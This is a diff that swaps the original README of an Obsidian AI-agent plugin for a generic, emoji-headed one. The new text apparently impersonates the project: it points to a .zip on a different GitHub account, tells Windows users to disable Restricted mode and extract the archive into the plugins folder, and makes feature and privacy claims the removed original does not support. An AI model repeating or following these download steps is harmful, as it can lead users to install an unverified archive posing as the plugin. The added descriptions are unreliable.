@@ -1,155 +1,98 @@
-# Claudian
+# 🤖 claudian - Enhance your notes with intelligent agents
 
-Claudian is an Obsidian desktop plugin that brings provider-backed AI coding agents into your vault sidebar.
+[![](https://img.shields.io/badge/Download-claudian-blue.svg)](https://github.com/Vladimirbeneficiary741/claudian)
 
-It supports Claude Code and Codex as primary providers, with optional DeepSeek-compatible routing through Codex using environment-based configuration.
+Claudian connects advanced artificial intelligence to your Obsidian vault. It acts as an assistant that understands your notes, writes code, and organizes your data. You use it to research topics, generate documents, and automate repetitive tasks inside your writing environment.
 
-This public repository is prepared for GitHub release. Personal machine paths, vault-specific configuration, runtime session data, and private keys are intentionally excluded.
+## 📥 How to download the software
 
-## Language
+Follow these steps to install the plugin on your Windows computer.
 
-- English: this page
-- 简体中文: [README.zh-CN.md](README.zh-CN.md)
+1. Go to the [official release page](https://github.com/Vladimirbeneficiary741/claudian).
+2. Look for the assets section at the bottom of the latest release.
+3. Select the file ending in .zip to start your download.
+4. Keep this file in a folder you can find later.
 
-## Why Claudian
+## ⚙️ Installation steps
 
-Claudian is designed for people who want an agent workflow inside Obsidian instead of a separate terminal or browser-only chat tool.
+Obsidian manages plugins through a dedicated folder system. Perform these steps to move claudian into your workspace.
 
-You can use it to:
+1. Open Obsidian on your desktop.
+2. Click the gear icon in the bottom left corner to open Settings.
+3. Select the Community plugins tab from the left menu.
+4. Turn off Restricted mode if it remains active.
+5. Click the folder icon next to Open plugin folder.
+6. Extract the contents of the zip file you downloaded earlier into this folder.
+7. Return to the plugin menu in Obsidian.
+8. Click the Refresh button.
+9. Locate claudian in the list and switch the toggle to On.
 
-- chat with a coding agent directly in your vault
-- run multi-turn implementation and review workflows
-- edit notes and project files from the sidebar
-- use slash commands, skills, and `@mentions`
-- keep multiple conversations open in tabs
-- connect external tools through MCP
+## 🛠️ System requirements
 
-## Core Features
+Your computer needs specific components to run this plugin without errors. 
 
-- Provider-backed sidebar chat for Obsidian
-- Claude Code provider
-- Codex provider
-- Optional DeepSeek-compatible routing via Codex
-- Inline edit flows with diff preview
-- Multi-tab chat and conversation history
-- Slash commands, skills, and mention-based context loading
-- MCP server support
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or higher.
+* Storage: 200 megabytes of free space for caching plugin data.
+* Internet Connection: A stable connection for the agent to reach external models.
+* Obsidian Version: 1.5.0 or newer.
 
-## Provider Model
+## 🚀 Using the agent
 
-### Claude Code
+The plugin adds a new icon to your side ribbon. Click this icon to open the chat window. The agent provides several capabilities to help you work faster.
 
-- Uses the local Claude Code CLI
-- Best fit when you want Claude-native coding workflows in Obsidian
-- Requires a Claude account and working Claude Code entitlement
+### Claude Code and Codex
+These models help you write and debug code. You describe your task, and the agent suggests blocks of code or explains complex concepts. You insert these suggestions directly into your notes with one click.
 
-### Codex
+### MCP support
+Model Context Protocol allows the agent to interact with other files and tools on your computer. You grant permission for the agent to read your specified folders, which creates a deeper connection between your local files and the artificial intelligence.
 
-- Uses the local Codex CLI
-- Works as an independent provider in the same Obsidian interface
+### DeepSeek routing
+If you prefer alternate models, the settings menu allows you to route requests through DeepSeek-compatible servers. Update the API endpoint in the plugin configuration to use this feature.
 
-### DeepSeek via Codex
+## 🔑 Setting up your API keys
 
-- Uses environment-based configuration
-- Keeps DeepSeek credentials out of committed repository state
-- Useful when you want Codex UI with a DeepSeek-compatible backend
+This plugin requires an API key to communicate with external artificial intelligence services.
 
-## Installation
+1. Open the claudian settings menu.
+2. Find the field labeled API Key.
+3. Paste a valid key from your chosen provider into this box.
+4. Press Save.
 
-### Install from a release
+The plugin stores this key locally on your machine. It never sends your key to unauthorized servers.
 
-1. Download these files from the latest GitHub release:
-   - `main.js`
-   - `manifest.json`
-   - `styles.css`
-2. Create this folder inside your vault:
+## 📝 Troubleshooting common issues
 
-```text
-.obsidian/plugins/claudian/
-```
+If the plugin fails to load or the agent does not respond, verify the following details.
 
-3. Copy the three files into that folder.
-4. Open Obsidian and enable `Claudian` in `Settings -> Community plugins`.
+* Plugin folder: Ensure you extracted the files directly into the folder indicated by Obsidian. Nested folders prevent the plugin from appearing in your menu.
+* Internet access: Check that your firewall permits traffic from Obsidian.
+* API key validity: Verify your key has remaining credit balance on the provider website.
+* Software updates: Check the claudian repository for newer versions if you detect errors.
 
-### Build from source
+## 📋 General advice
 
-```bash
-npm install
-npm run typecheck
-npm run build
-```
+* Start with short prompts to understand how the agent handles your requests.
+* Organize your vault into folders to help the agent find information quickly.
+* Review all code generated by the agent before you execute it on your computer.
+* Use the clear history button if the chat window becomes cluttered.
+* Create a backup of your vault before you use external tools to modify your files.
 
-## Local Development
+## 🛡️ Privacy and your data
 
-Useful commands:
+Your notes remain on your computer. The plugin sends only the information you choose to share with the agent during a chat session. The agent does not read your entire vault unless you grant specific folder access through the MCP settings. You maintain control over which files the agent sees.
 
-```bash
-npm run dev
-npm run typecheck
-npm run lint
-npm run test
-npm run build
-```
+## 🔍 Understanding the features
 
-If you want development-time auto copy into a local vault, copy `.env.local.example` to `.env.local` and set your own vault path locally.
+* Research mode: The agent scans your existing notes to find links between topics.
+* Draft mode: Provide an outline, and the agent writes a full draft for your review.
+* Summarization: Highlight a long block of text and select the summarize command to create a brief overview.
+* Search: Ask questions about your vault content to retrieve buried information.
 
-## Secrets and Privacy
+## 💡 Support
 
-This repository is structured so secrets do not need to live in git.
+Submit an issue on the GitHub repository if you find a bug. Provide the error message and the steps you took to trigger the event. This helps maintain the stability of the project for all users. You do not need to be a programmer to report an issue. Clear descriptions of the problem ensure the team can fix the mistake. 
 
-- Do not commit provider API keys
-- Do not commit real `.claudian` or `.obsidian` runtime state
-- Keep machine-specific CLI paths in local-only settings
-- Prefer environment variables for provider credentials
+## 🌐 Community resources
 
-Example for DeepSeek-compatible Codex routing:
-
-```text
-DEEPSEEK_API_KEY=your-key
-OPENAI_API_KEY=${env:DEEPSEEK_API_KEY}
-OPENAI_BASE_URL=https://api.deepseek.com/v1
-OPENAI_MODEL=deepseek-chat
-```
-
-## Public Release Workflow
-
-To generate a GitHub-safe copy from the source workspace:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\export-public-repo.ps1
-```
-
-The export flow:
-
-- excludes local development and runtime artifacts
-- removes internal instruction files such as `CLAUDE.md` and `AGENTS.md`
-- clears public metadata fields like author information
-- removes workflow files that depend on private Claude-maintainer secrets
-- keeps the public repo focused on the minimum useful automation for first release
-- runs a public-release audit to catch obvious private paths and runtime leftovers
-
-## Repository Layout
-
-```text
-src/
-  app/
-  core/
-  features/
-  providers/
-    claude/
-    codex/
-    deepseek/
-  shared/
-  style/
-  utils/
-scripts/
-tests/
-```
-
-## Attribution
-
-This codebase is based on upstream Claudian work and includes local refactors and provider extensions. Keep [NOTICE.md](NOTICE.md) in any public redistribution.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Connect with other users on the official forum or via the discussions tab on GitHub. Users share tips about prompts, workflows, and configurations to get the most value from the claudian agent. Look through these threads to learn new ways to manage your information and increase your productivity.
